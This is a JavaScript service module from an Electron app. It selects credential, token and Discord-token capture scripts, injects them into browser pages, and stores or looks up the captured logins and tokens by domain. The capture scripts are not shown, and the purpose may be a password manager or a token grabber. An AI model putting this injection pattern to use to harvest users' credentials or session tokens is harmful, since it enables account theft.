/**
 * 🔐 Credential Capture Service
 * Servicio orquestador principal para captura de credenciales y tokens
 * Coordina los diferentes scripts y procesadores
 */

import { GENERIC_CREDENTIAL_SCRIPT } from '../credential-scripts/generic-credential-script.js';
import { TOKEN_CAPTURE_SCRIPT } from '../credential-scripts/token-capture-script.js';
import { DISCORD_CAPTURE_SCRIPT } from '../credential-scripts/discord-capture-script.js';
import { processCredential, updateCredential, findCredentials } from './credential-processor.js';
import { processToken, getTokensByService } from './token-processor.js';

/**
 * Clase principal para manejar la captura de credenciales
 */
class CredentialCaptureService {
  
  /**
   * Obtiene el script de captura apropiado según el tipo
   * @param {string} scriptType - Tipo de script ('credential', 'token', 'discord', 'all')
   * @returns {string} - Script(s) a inyectar
   */
  static getScript(scriptType = 'credential') {
    console.log('📜 [CredentialCaptureService] Obteniendo script:', scriptType);
    
    switch (scriptType) {
      case 'credential':
        return GENERIC_CREDENTIAL_SCRIPT;
      
      case 'token':
        return TOKEN_CAPTURE_SCRIPT;
      
      case 'discord':
        return DISCORD_CAPTURE_SCRIPT;
      
      case 'all':
        // Combinar todos los scripts
        return `
          ${GENERIC_CREDENTIAL_SCRIPT}
          ${TOKEN_CAPTURE_SCRIPT}
        `;
      
      case 'discord-full':
        // Scripts específicos para Discord
        return `
          ${GENERIC_CREDENTIAL_SCRIPT}
          ${TOKEN_CAPTURE_SCRIPT}
          ${DISCORD_CAPTURE_SCRIPT}
        `;
      
      default:
        console.warn('⚠️ [CredentialCaptureService] Tipo de script desconocido, usando genérico');
        return GENERIC_CREDENTIAL_SCRIPT;
    }
  }
  
  /**
   * Inyecta el script de captura en un webContents
   * @param {number} webContentsId - ID del webContents
   * @param {string} scriptType - Tipo de script a inyectar
   * @returns {Promise<Object>} - Resultado de la inyección
   */
  static async injectScript(webContentsId, scriptType = 'all') {
    try {
      console.log(`🔌 [CredentialCaptureService] Inyectando script en webContents ${webContentsId}`);
      
      const { webContents } = await import('electron');
      const targetWebContents = webContents.fromId(webContentsId);
      
      if (!targetWebContents) {
        throw new Error(`WebContents con ID ${webContentsId} no encontrado`);
      }
      
      // Verificar que el webContents no esté destruido o cargando
      if (targetWebContents.isDestroyed() || targetWebContents.isLoading()) {
        console.warn('⚠️ [CredentialCaptureService] WebContents no está listo, saltando inyección');
        return {
          success: false,
          message: 'WebContents no está listo para inyectar scripts'
        };
      }
      
      const script = this.getScript(scriptType);
      
      // Intentar inyectar con timeout y manejo de errores
      try {
        await targetWebContents.executeJavaScript(script);
        console.log('✅ [CredentialCaptureService] Script inyectado exitosamente');
      } catch (execError) {
        console.warn('⚠️ [CredentialCaptureService] Error ejecutando script:', execError.message);
        return {
          success: false,
          error: `Error de ejecución: ${execError.message}`
        };
      }
      
      return {
        success: true,
        message: 'Script inyectado correctamente',
        scriptType
      };
      
    } catch (error) {
      console.error('❌ [CredentialCaptureService] Error inyectando script:', error);
      return {
        success: false,
        error: error.message
      };
    }
  }
  
  /**
   * Procesa credenciales capturadas
   */
  static async processCapturedCredential(credentialData) {
    return await processCredential(credentialData);
  }
  
  /**
   * Procesa tokens capturados
   */
  static async processCapturedToken(tokenData) {
    return await processToken(tokenData);
  }
  
  /**
   * Actualiza una credencial existente
   */
  static async updateExistingCredential(id, credentialData) {
    return await updateCredential(id, credentialData);
  }
  
  /**
   * Busca credenciales por dominio
   */
  static async findCredentialsByDomain(domain) {
    return await findCredentials(domain);
  }
  
  /**
   * Busca tokens por servicio
   */
  static async findTokensByService(serviceName) {
    return await getTokensByService(serviceName);
  }
  
  /**
   * Verifica si hay credenciales guardadas para una URL
   * @param {string} url - URL a verificar
   * @returns {Promise<Object>} - Credenciales encontradas
   */
  static async checkSavedCredentials(url) {
    try {
      console.log(`🔍 [CredentialCaptureService] Buscando credenciales para ${url}`);
      
      // Extraer dominio de la URL
      const urlObj = new URL(url);
      const domain = urlObj.hostname.replace('www.', '');
      
      // Buscar credenciales por dominio
      const result = await findCredentials(domain);
      
      return {
        success: true,
        credentials: result.credentials || []
      };
      
    } catch (error) {
      console.error('❌ [CredentialCaptureService] Error buscando credenciales:', error);
      return {
        success: false,
        error: error.message,
        credentials: []
      };
    }
  }
}

// Exportar para compatibilidad con imports antiguos
export const CREDENTIAL_CAPTURE_SCRIPT = GENERIC_CREDENTIAL_SCRIPT;
export { TOKEN_CAPTURE_SCRIPT, DISCORD_CAPTURE_SCRIPT };
export const processCapturedCredential = CredentialCaptureService.processCapturedCredential.bind(CredentialCaptureService);
export const processCapturedToken = CredentialCaptureService.processCapturedToken.bind(CredentialCaptureService);

export default CredentialCaptureService;
